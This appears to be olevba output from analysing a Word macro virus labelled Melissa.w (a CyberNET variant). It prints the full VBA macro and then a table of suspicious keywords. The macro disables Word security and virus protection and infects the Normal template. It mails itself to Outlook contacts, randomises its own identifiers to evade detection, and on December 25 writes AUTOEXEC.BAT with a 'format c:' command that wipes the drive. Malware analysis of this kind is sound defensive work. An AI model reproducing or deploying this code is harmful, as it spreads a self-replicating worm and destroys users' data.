olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.w-a8c1d4eb8afc8277ce7e6509c388793a66d440d6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.w-a8c1d4eb8afc8277ce7e6509c388793a66d440d6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call SA491
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For SN4186 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next SN4186: End If
IO9888 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
IG4741 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set JN4543 = ActiveDocument.VBProject.VBComponents
Call RB471(JN4543)
VC5329 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set JN4543 = NormalTemplate.VBProject.VBComponents
Call RB471(JN4543)
NP6732 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "DH589": r1(2) = "IT2511": r1(3) = "LG1348": r1(4) = "OG9871": r1(5) = "TF8158": r1(6) = "IO9888": r1(7) = "IG4741": r1(8) = "VC5329": r1(9) = "JN4543": r1(10) = "NP6732"
r1(11) = "LK104": r1(12) = "LG7154": r1(13) = "GD3212": r1(14) = "MM7224": r1(15) = "LE9850": r1(16) = "SA491": r1(17) = "DT5143": r1(18) = "AB7772": r1(19) = "DV3116": r1(20) = "UP298"
r1(21) = "SA3435": r1(22) = "VD728": r1(23) = "KR5565": r1(24) = "RB471": r1(25) = "OV4114": r1(26) = "NE7187": r1(27) = "SN4186": r1(28) = "SU8787": r1(29) = "UM5530"
For LE9850 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call TF8158(a1, r1(LE9850))
Next LE9850
ActiveDocument.Saved = True
End If
If NP6732 <> True And VC5329 <> True Then GoTo LK104
If NP6732 = True Then JN4543.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IO9888 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If VC5329 = True Then JN4543.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IG4741 - 8))
LK104:
If IG4741 <> 0 And IO9888 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function TF8158(MM7224, GD3212 As String)
On Error Resume Next
Dim DH589 As Long: Dim IT2511 As Long: Dim LG1348 As Long: Dim OG9871 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DH589 = 1: IT2511 = 1: LG1348 = .CountOfLines: OG9871 = Len(.Lines(.CountOfLines, 1))
Do While .Find(GD3212, DH589, IT2511, LG1348, OG9871, True)
strline = .Lines(DH589, 1)
strline = Left(strline, IT2511 - 1) & MM7224 & Mid(strline, OG9871)
.ReplaceLine DH589, strline
DH589 = LG1348 + 1: IT2511 = 1
LG1348 = .CountOfLines
OG9871 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function SA491()
On Error Resume Next
Dim DV3116, UP298, SA3435
Set DV3116 = CreateObject("Outlook.Application")
Set UP298 = DV3116.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If DV3116 = "Outlook" Then
UP298.Logon "profile", "password"
For DT5143 = 1 To UP298.AddressLists.Count
Set UM5530 = UP298.AddressLists(DT5143)
NE7187 = 1
Set SA3435 = DV3116.CreateItem(0)
For AB7772 = 1 To UM5530.AddressEntries.Count
SU8787 = UM5530.AddressEntries(NE7187)
SA3435.Recipients.Add SU8787
NE7187 = _
NE7187 + 1
If NE7187 > 50 Then AB7772 = UM5530.AddressEntries.Count
Next AB7772
SA3435.Subject = "Message From " & Application.UserName
SA3435.Body = "This document is very Important and you've GOT to read this !!!"
SA3435.Attachments.Add ActiveDocument.FullName
SA3435.Send
SU8787 = ""
Next DT5143
UP298.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function RB471(JN4543)
Dim OV4114 As Object
For Each OV4114 In JN4543
OV4114.CodeModule.DeleteLines 1, _
OV4114.CodeModule.CountOfLines
Next OV4114
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function










+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
